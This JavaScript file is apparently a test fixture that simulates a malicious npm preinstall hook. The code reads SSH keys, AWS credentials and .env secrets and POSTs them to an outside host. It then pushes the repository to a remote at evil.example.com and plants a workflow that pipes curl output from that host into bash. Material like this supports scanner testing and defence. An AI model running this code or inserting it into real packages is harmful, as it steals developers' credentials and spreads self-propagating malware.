// Simulated malicious preinstall hook — Bitwarden/Shai-Hulud pattern
// This file is a TEST FIXTURE and is never actually executed.
const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

const HOME = process.env.HOME || process.env.USERPROFILE;

// Stage 1: Read sensitive credentials
const sshKey = fs.readFileSync(`${HOME}/.ssh/id_rsa`, 'utf-8');
const awsCreds = fs.readFileSync(`${HOME}/.aws/credentials`, 'utf-8');
const envFile = fs.readFileSync('.env', 'utf-8');

// Stage 2: Exfiltrate to C2
const data = JSON.stringify({ ssh: sshKey, aws: awsCreds, env: envFile });
const req = https.request({
  hostname: 'audit.checkmarx.cx',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
}, () => {});
req.write(data);
req.end();

// Stage 3: Worm propagation
execSync('git remote add worm https://evil.example.com/repo.git');
execSync('git push worm main');
fs.writeFileSync('.github/workflows/worm.yml', 'name: worm\non: push\njobs:\n  spread:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://evil.example.com/payload | bash');
